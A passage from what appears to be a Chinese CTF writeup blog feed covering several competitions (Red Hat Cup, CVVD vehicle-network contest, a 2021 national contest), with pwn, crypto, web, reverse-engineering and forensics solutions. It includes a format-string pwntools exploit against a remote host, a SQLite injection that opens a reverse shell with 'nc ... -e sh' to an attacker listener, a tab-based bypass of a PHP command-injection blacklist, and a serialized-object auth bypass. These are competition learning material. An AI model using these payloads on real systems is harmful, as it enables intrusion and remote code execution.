a</span></span><br><span class="line"><span class="string">Content-Length: -1\n</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload=string+<span class="string">&#x27;%227$p%14$p&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./chall&quot;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line"><span class="comment"># p=process(&#x27;./chall&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.27.so&#x27;&#125;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;47.105.94.48&quot;</span>,<span class="number">12435</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,&quot;b *$rebase(0x137D)&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">leak=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;leak:&quot;</span>+<span class="built_in">hex</span>(leak))</span><br><span class="line">stack=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;stack:&quot;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">target=stack+(<span class="number">0x7ffc0ba3fca8</span>-<span class="number">0x7ffc0ba3f880</span>)<span class="comment">#(0x7ffdbd1704e8-0x7ffdbd1700c0)</span></span><br><span class="line">log.info(<span class="string">&quot;target:&quot;</span>+<span class="built_in">hex</span>(target))</span><br><span class="line">libc_base = leak - (<span class="number">0x7f33149f8b97</span>-<span class="number">0x7f33149d7000</span>)<span class="comment">#0x21bf7</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;malloc_hook:&quot;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line">one = libc_base + <span class="number">0x4f3c2</span><span class="comment">#0x4f3d5</span></span><br><span class="line">log.info(<span class="string">&quot;one:&quot;</span>+<span class="built_in">hex</span>(one))</span><br><span class="line">first = one &amp; <span class="number">0xffff</span></span><br><span class="line">log.info(<span class="string">&quot;first:&quot;</span>+<span class="built_in">hex</span>(first))</span><br><span class="line">second = (one&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>+<span class="number">0x10000</span></span><br><span class="line">log.info(<span class="string">&quot;second:&quot;</span>+<span class="built_in">hex</span>(second))</span><br><span class="line">payload = string +<span class="string">&#x27;a&#x27;</span>*<span class="number">0x6</span>+(<span class="string">&quot;%&quot;</span>+ <span class="built_in">str</span>(first-<span class="number">6</span>) +<span class="string">&quot;c%42$hn&quot;</span>).ljust(<span class="number">0x20</span>,<span class="string">&#x27;b&#x27;</span>)+p64(target)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload = string +<span class="string">&#x27;a&#x27;</span>*<span class="number">0x6</span>+(<span class="string">&quot;%&quot;</span>+ <span class="built_in">str</span>(second-<span class="number">6</span>) +<span class="string">&quot;c%42$hn&quot;</span>).ljust(<span class="number">0x20</span>,<span class="string">&#x27;b&#x27;</span>)+p64(target+<span class="number">2</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="hpcurve"><a href="#hpcurve" class="headerlink" title="hpcurve"></a>hpcurve</h2><p>相似的题：<a href="https://jsur.in/posts/2020-12-21-hxp-ctf-2020-hyper-writeup">https://jsur.in/posts/2020-12-21-hxp-ctf-2020-hyper-writeup</a></p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">p = <span class="number">10000000000000001119</span></span><br><span class="line"></span><br><span class="line">K = GF(p)</span><br><span class="line">R.&lt;x&gt; = K[]</span><br><span class="line">y = x</span><br><span class="line">f = y + prod(<span class="built_in">map</span>(<span class="built_in">eval</span>, <span class="string">&#x27;yyyyyyy&#x27;</span>))</span><br><span class="line">C = HyperellipticCurve(f, <span class="number">0</span>)</span><br><span class="line">J = C.jacobian()</span><br><span class="line">Ds = [J(C(x, <span class="built_in">min</span>(f(x).sqrt(<span class="number">0</span>, <span class="number">1</span>)))) <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getV</span>(<span class="params">u</span>):</span></span><br><span class="line">    ys = []</span><br><span class="line">    result = []</span><br><span class="line">    Kbar = GF(p^<span class="number">6</span>)</span><br><span class="line">    Rbar.&lt;t&gt; = Kbar[<span class="string">&quot;t&quot;</span>]</span><br><span class="line">    u2 = u.change_ring(Rbar)</span><br><span class="line">    roots = [x[<span class="number">0</span>] <span class="keyword">for</span> x <span class="keyword">in</span> u2.roots()]</span><br><span class="line">    <span class="keyword">for</span> root <span class="keyword">in</span> roots:</span><br><span class="line">        ys.append(f(root).sqrt(<span class="number">0</span>, <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">for</span> perm <span class="keyword">in</span> product(<span class="built_in">range</span>(<span class="number">2</span>), repeat=<span class="number">3</span>):</span><br><span class="line">        polynomial = Rbar.lagrange_polynomial(</span><br><span class="line">            [(roots[i], ys[i][perm[i]]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)])</span><br><span class="line">        <span class="keyword">if</span> polynomial[<span class="number">0</span>] <span class="keyword">in</span> K:</span><br><span class="line">            result.append(R(polynomial))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getU</span>(<span class="params">output, <span class="built_in">input</span></span>):</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">        result.append(output[i]^^<span class="built_in">input</span>[i])</span><br><span class="line">    result = <span class="built_in">bytes</span>(result)</span><br><span class="line">    u0, u1, u2 = struct.unpack(<span class="string">&quot;&lt;QQQ&quot;</span>, result)</span><br><span class="line">    u = x^<span class="number">3</span>+x^<span class="number">2</span>*u2+x*u1+u0</span><br><span class="line">    <span class="keyword">return</span> u</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">o, u, v</span>):</span></span><br><span class="line">    tmp = []</span><br><span class="line">    result = [u[<span class="number">0</span>], u[<span class="number">1</span>], u[<span class="number">2</span>], v[<span class="number">0</span>], v[<span class="number">1</span>], v[<span class="number">2</span>]]</span><br><span class="line">    otp = struct.pack(<span class="string">&quot;&lt;QQQQQQ&quot;</span>, *result)</span><br><span class="line">    otp = otp*<span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(o)):</span><br><span class="line">        tmp.append(o[i]^^otp[i])</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(tmp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">output = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;66def695b20eeae3141ea80240e9bc7138c8fc5aef20532282944ebbbad76a6e17446e92de5512091fe81255eb34a0e22a86a090e25dbbe3141aff0542f5&quot;</span>)</span><br><span class="line"><span class="built_in">input</span> = <span class="string">b&quot;aaaaaaaaaaaaaaaaaaaaflag&quot;</span></span><br><span class="line">u = getU(output, <span class="built_in">input</span>)</span><br><span class="line">v_list = getV(u)</span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> v_list:</span><br><span class="line">    print(decode(output, u, v))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="primegame"><a href="#primegame" class="headerlink" title="primegame"></a>primegame</h2><p><a href="http://www.secmem.org/blog/2020/09/20/poka-science-war-hacking/">http://www.secmem.org/blog/2020/09/20/poka-science-war-hacking/</a></p><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math,random,structfrom decimal <span class="keyword">import</span> *ct = 597952043660446249020184773232983974017780255881942379044454676980646417087515453primes = [<span class="number">2</span>]keys = []arrary = []getcontext().prec = <span class="built_in">int</span>(<span class="number">100</span>)<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">100</span>):    f = <span class="literal">True</span>    <span class="keyword">for</span> j <span class="keyword">in</span> primes:        <span class="keyword">if</span> i * i &lt; j:            <span class="keyword">break</span>        <span class="keyword">if</span> i % j == <span class="number">0</span>:            f = <span class="literal">False</span>            <span class="keyword">break</span>    <span class="keyword">if</span> f:        primes.append(i)<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(primes)):    keys.append(Decimal(<span class="built_in">int</span>(primes[i])).ln())<span class="keyword">for</span> key <span class="keyword">in</span> keys:    arrary.append(<span class="built_in">int</span>(key * <span class="built_in">int</span>(<span class="number">16</span>) ** <span class="built_in">int</span>(<span class="number">64</span>)))<span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">result</span>):</span>    h = Decimal(<span class="built_in">int</span>(<span class="number">0</span>))    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(keys)):        h += result[i] * keys[i]    ct = <span class="built_in">int</span>(h * <span class="built_in">int</span>(<span class="number">16</span>)**<span class="built_in">int</span>(<span class="number">64</span>))    <span class="keyword">return</span> ctdef getflags(N):    length = <span class="built_in">len</span>(arrary)    A = Matrix(ZZ, length + <span class="number">1</span>, length + <span class="number">1</span>)    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):        A[i, i] = <span class="number">1</span>        A[i, length] = arrary[i] // N        A[length, i] = <span class="number">64</span>    A[length, length] = ct // N    result = A.LLL()    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length + <span class="number">1</span>):        flag = <span class="number">1</span>        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(length):            <span class="keyword">if</span> -<span class="number">64</span> &lt;= result[i][j] &lt; <span class="number">64</span>:                <span class="keyword">continue</span>            flag = <span class="number">0</span>            <span class="keyword">break</span>        <span class="keyword">if</span> flag:            vec = [<span class="built_in">int</span>(v + <span class="number">64</span>) <span class="keyword">for</span> v <span class="keyword">in</span> result[i][:-<span class="number">1</span>]]            tmp = decrypt(vec)            <span class="keyword">if</span> tmp == ct:                print(N, <span class="built_in">bytes</span>(vec))            <span class="keyword">else</span>:                print(<span class="string">&quot;NO&quot;</span>, tmp, <span class="built_in">bytes</span>(vec))<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):    print(i)    getflags(i)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红帽杯 </tag>
            
            <tag> 格式化字符串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021 CVVD首届车联网漏洞挖掘赛线上初赛Writeup</title>
      <link href="archives/cb381383/"/>
      <url>archives/cb381383/</url>
      
        <content type="html"><![CDATA[<h1 id="2021-CVVD首届车联网漏洞挖掘赛线上初赛G2mtu-Writeup"><a href="#2021-CVVD首届车联网漏洞挖掘赛线上初赛G2mtu-Writeup" class="headerlink" title="2021 CVVD首届车联网漏洞挖掘赛线上初赛G2mtu Writeup"></a>2021 CVVD首届车联网漏洞挖掘赛线上初赛G2mtu Writeup</h1><h2 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h2><p>原题</p><p><a href="https://blog.csdn.net/weixin_46676743/article/details/113726655">https://blog.csdn.net/weixin_46676743/article/details/113726655</a></p><p>带着</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImVicmVidW5hIiwicGFzc3dvcmQiOiIiLCJhZG1pbiI6ImdlaHIiLCJpYXQiOjE2MjA0NTgwMzJ9.QkpCPfCtmMmeEYRoLFzzT8ag7mIaIPIcbZLZABqnXHw</span><br></pre></td></tr></table></figure><p>访问/admin</p><h2 id="CAN总线4"><a href="#CAN总线4" class="headerlink" title="CAN总线4"></a>CAN总线4</h2><p>通过诊断服务报文使ECU停止发送网络管理报文，但仍能接收应用报文，请写出诊断服务报文数据场的前4字节。</p><p>参考<a href="https://blog.csdn.net/usstmiracle/article/details/109214586">https://blog.csdn.net/usstmiracle/article/details/109214586</a></p><p>0x04 应用层有四字节</p><p>0x28 CommunicationControl </p><p>0x01 enableRxAndDisableTx（激活接收和关闭发送）</p><p>0x2代表网络管理报文</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;04 28 01 02&#125;</span><br></pre></td></tr></table></figure><h2 id="CAN总线6"><a href="#CAN总线6" class="headerlink" title="CAN总线6"></a>CAN总线6</h2><p>通过诊断服务使ECU进入扩展会话，如果ECU肯定响应，请写出ECU回复报文数据场的第2、3字节内容，如果ECU否定响应，请写出ECU回复报文数据场的第2、3字节内容。</p><p>参考<a href="https://zhuanlan.zhihu.com/p/37310388">https://zhuanlan.zhihu.com/p/37310388</a></p><p>肯定响应，50=10+40表示对SID的肯定回复，03是Extended扩展会话。</p><p>否定响应，7F表示否定响应，10是SID，表示诊断模式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;50 03 7F 10&#125;</span><br></pre></td></tr></table></figure><h2 id="stealthupload"><a href="#stealthupload" class="headerlink" title="stealthupload"></a>stealthupload</h2><p>首先把附件下载uploader_ec1afb6e216063e8e0be11604e51a050.pcapng，然后拖进wireshark</p><p>然后<code>ctrl+F</code>打开分组字节流搜索，选择字符串，直接输入flag</p><p>然后发现有个flag.txt的字样，试着把这个压缩包导出。</p><p>直接用：文件-&gt;导出分组字节流-&gt;保存文件</p><p>但是导出后的压缩包解压之后发现并没有什么用</p><p>但是发现这里是使用qq邮箱传文件</p><p><img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200404000952911.png" alt="image-20200404000952911"></p><p>于是使用包过滤语句<code>http.request.method==POST</code></p><p>发现有5个连续的包。</p><p>这里需要去掉这5个包相同的头文件</p><p>先点击第一个数据包。可以发现长度为<code>131436 bytes</code></p><p>依次发现第2，3，4个数据包长度均为<code>131436 bytes</code></p><p>第5个包长度为<code>1777 bytes</code></p><p>所以5个包的总长度为</p><p><code>131436*4+1777=527571</code></p><p>接着使用ctrl+F搜索logattsize，logattsize 这个参数为该包中通过qq邮箱传输的文件大小参数</p><p><img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200404001642211.png" alt="image-20200404001642211"></p><p><code>527571-525701=1820</code> </p><p>1820就是五个包的文件头总和</p><p><code>1820/5=364</code> </p><p>364就是每个包的文件头字节数</p><p>这里我们把字节数算出来之后，就需要把这五个包导出来，导出之后用 shell命令 dd，依次把五个文件去掉文件头保存成另一文件</p><p>依次对1,2,3,4,5文件执行，分别保存为01,02,03,04,05</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy /B <span class="number">01</span>+<span class="number">02</span>+<span class="number">03</span>+<span class="number">04</span>+<span class="number">05</span> bugkufly.rar</span><br></pre></td></tr></table></figure><p> 但是解压的时候出现了问题</p><p>可能是zip伪加密，打开010编辑器。把图中84改为80。</p><p><img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200404002444543.png" alt="image-20200404002444543"></p><p>改完之后把文件后缀改为exe，再放到kail里面binwalk</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e flag.exe</span><br></pre></td></tr></table></figure><p>发现没有想要的东西。再用foremost试一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost -T flag.exe</span><br></pre></td></tr></table></figure><p>出现了二维码图片，用手机扫一下即可得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;m1Sc_oxO2_Fly&#125;</span><br></pre></td></tr></table></figure><h2 id="SQL注入解决不了问题"><a href="#SQL注入解决不了问题" class="headerlink" title="SQL注入解决不了问题"></a>SQL注入解决不了问题</h2><p>原题：<a href="https://castilho101.github.io/midnightsun-2021-ctf/">https://castilho101.github.io/midnightsun-2021-ctf/</a></p><p>传入参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?userdata&#x3D;Tzo4OiJzdGRDbGFzcyI6NDp7czo4OiJ1c2VybmFtZSI7czoxMToiRDBsb3Jlc0g0emUiO3M6ODoicGFzc3dvcmQiO3M6MTM6InJhc211c2xlcmRvcmYiO3M6MTM6Il9jb3JyZWN0VmFsdWUiO047czozOiJtZmEiO1I6NDt9</span><br></pre></td></tr></table></figure><p>然后得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;CVVD_Y5owvt9Rs4&#125;</span><br></pre></td></tr></table></figure><h2 id="绕过检测是一门艺术"><a href="#绕过检测是一门艺术" class="headerlink" title="绕过检测是一门艺术"></a>绕过检测是一门艺术</h2><p>题目如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);$filter &#x3D; &#39;&#x2F;#|&#96;| |[\x0a]|ls|rm|sleep|sh|bash|grep|nc|ping|curl|cat|tac|od|more|less|nl|vi|unique|head|tail|sort|rev|string|find|\$|\(\|\)|\[|\]|\&#123;|\&#125;|\&gt;|\&lt;|\?|\&#39;|&quot;|\*|;|\||&amp;|\&#x2F;|\\\\&#x2F;is&#39;;$cmd &#x3D; $_POST[&#39;cmd&#39;];if(!preg_match($filter, $cmd))&#123;    system($cmd.&quot;echo &#39;hi~&#39;&quot;);&#125;else&#123;    die(&quot;???&quot;);&#125;?&gt;</span><br></pre></td></tr></table></figure><p>先用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir%09.%09</span><br></pre></td></tr></table></figure><p>看到有个文件夹<code>CvvD_F14g_1s_h4rehaha.php</code>，然后读取文件</p><p><code>payload</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd&#x3D;cut%09-f%091%09CvvD_F14g_1s_h4rehaha.php%09</span><br></pre></td></tr></table></figure><p>然后得到<code>flag</code></p><h2 id="答案并不在数据库中"><a href="#答案并不在数据库中" class="headerlink" title="答案并不在数据库中"></a>答案并不在数据库中</h2><p>原题：<a href="https://pocas.kr/2021/03/08/2021-03-08-zer0pts-CTF-2021/">https://pocas.kr/2021/03/08/2021-03-08-zer0pts-CTF-2021/</a></p><p>脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;192.168.1.103:8003&quot;username &#x3D; &#39;&quot;;\n.sh nc 661356205 12 -e sh\n&#39;data &#x3D; &#123;&quot;username&quot;: username, &quot;password&quot;: &quot;pocas&quot;&#125;requests.post(url+&quot;&#x2F;login&quot;, data)</span><br></pre></td></tr></table></figure><p>ip使用十进制绕一下</p><p>然后在vps监听<code>nc -lvnp 12</code>，可以反弹一个shell。反弹之后根目录下有个flag直接读就行了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;CVVD_QKtmeZ86U9&#125;</span><br></pre></td></tr></table></figure><h2 id="提交答案的一百种方式"><a href="#提交答案的一百种方式" class="headerlink" title="提交答案的一百种方式"></a>提交答案的一百种方式</h2><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>取cvvd为密钥，进行表替换，不过表的值直接从内存中取即可，明文首先通过循环左移一位，然后与表内容异或，最后进行base64逆过来即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64temp = []miyao = [<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;d&#x27;</span>]temp = [<span class="number">0xdf</span>,<span class="number">0x66</span>,<span class="number">0x52</span>,<span class="number">0xb9</span>,<span class="number">0x20</span>,<span class="number">0x1a</span>,<span class="number">0x17</span>,<span class="number">0x29</span>,<span class="number">0xed</span>,<span class="number">0x76</span>,<span class="number">0x67</span>,<span class="number">0x5b</span>,<span class="number">0x58</span>,<span class="number">0x22</span>,<span class="number">0xd1</span>,<span class="number">0x44</span>,<span class="number">0x26</span>,<span class="number">0x3e</span>,<span class="number">0xc6</span>,<span class="number">0xfb</span>,<span class="number">0xb4</span>,<span class="number">0x3f</span>,<span class="number">0x33</span>,<span class="number">0x4b</span>]encrypt = <span class="string">&quot;GYq+cZ7Iqb8xFonl/EQ9zsJUDA==&quot;</span>decrypt = base64.b64decode(encrypt)<span class="built_in">print</span> <span class="built_in">len</span>(decrypt)decrypt = <span class="built_in">list</span>(decrypt)<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(decrypt)):decrypt[i] = <span class="built_in">chr</span>((temp[i]^<span class="built_in">ord</span>(decrypt[i])))decrypt[i] = <span class="built_in">chr</span>((((<span class="built_in">ord</span>(decrypt[i])&lt;&lt;<span class="number">7</span>)&amp;<span class="number">0xff</span>)|((<span class="built_in">ord</span>(decrypt[i])&gt;&gt;<span class="number">1</span>)&amp;<span class="number">0xff</span>)))flag=<span class="string">&quot;&quot;</span><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(decrypt)):flag+=decrypt[i]<span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure><h2 id="你知道什么是反编译么"><a href="#你知道什么是反编译么" class="headerlink" title="你知道什么是反编译么"></a>你知道什么是反编译么</h2><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>加密代码在so中，考察so逆向，并且是攻防世界的原题</p><p>将f72c5a36569418a20907b55be5bf95ad两两交换得到7fc2a5636549812a90705bb55efb59da<br>将7fc2a5636549812a90705bb55efb59da以中间一分为二，头拼接到尾，得到90705bb55efb59da7fc2a5636549812a</p><h2 id="这次不是反编译了"><a href="#这次不是反编译了" class="headerlink" title="这次不是反编译了"></a>这次不是反编译了</h2><p>逻辑很简单，每个字符经过运算都需要等到0x30，并且变量为下标，直接逆即可</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag=<span class="string">&quot;&quot;</span><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):flag += <span class="built_in">chr</span>((<span class="number">0xff</span>-i-<span class="number">100</span>-<span class="number">0x30</span>)%<span class="number">256</span>)<span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure><h2 id="我想用用你的网"><a href="#我想用用你的网" class="headerlink" title="我想用用你的网"></a>我想用用你的网</h2><p>Wireshark 找到 eapol 协议的 wifi 链接认证 WPA 的四次握手包，爆破链接密码即可。用手机号码字典爆破成功：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;13910407686&#125;</span><br></pre></td></tr></table></figure><h2 id="stegsolve"><a href="#stegsolve" class="headerlink" title="stegsolve"></a>stegsolve</h2><p>右键看源码发现有两个图片（base64编码），都down下来，mac打开titf格式那张图，看到flag</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210508204031.png" alt="20210508202457"></p><h2 id="可以进行嗅探的可不止是嗅探犬"><a href="#可以进行嗅探的可不止是嗅探犬" class="headerlink" title="可以进行嗅探的可不止是嗅探犬"></a>可以进行嗅探的可不止是嗅探犬</h2><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210508201432.png" alt="WX20210508-153405"></p><h2 id="wireshark是电线上的鲨鱼么？"><a href="#wireshark是电线上的鲨鱼么？" class="headerlink" title="wireshark是电线上的鲨鱼么？"></a>wireshark是电线上的鲨鱼么？</h2><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210508201649.png" alt="image-20210508201648076"></p><h2 id="stegsolve-simple？"><a href="#stegsolve-simple？" class="headerlink" title="stegsolve-simple？"></a>stegsolve-simple？</h2><p>题目提示 stegsolve 联系杂项工具 stegsolve 。blue plane 1 有隐藏信息，data extract 提取出来即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;cicv_a_simple_flag&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 流量分析 </tag>
            
            <tag> ECU </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021年全国网络空间安全技术大赛Writeup</title>
      <link href="archives/38aa2360/"/>
      <url>archives/38aa2360/</url>
      
        <content type="html"><![CDATA[<h2 id="bank"><a href="#bank" class="headerlink" title="bank"></a>bank</h2><p>最直观就是格式化字符串漏洞，用来读取堆上的 flag ：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210506201809.png" alt="image-20210506201801753"></p><p>进入分支需要经过一个 strcmp 的校验，这里的写法是：<code>if ( !strcmp(s1, password) )</code> ，需要返回值是 0 ，多了个取反符号，用截断绕不过去</p><p>问题是出在生成密码的地方，生成密码后用 fgets 读入，都是 gets 家族的函数，遇到 \n 就停止输入，当生成的密码首位是 \n ，那么密码全为 0x00 。一开始没发现，正常时用 read 读入就没有这个问题。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./bank&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,&quot;b *0x4013BF&quot;)</span></span><br><span class="line"><span 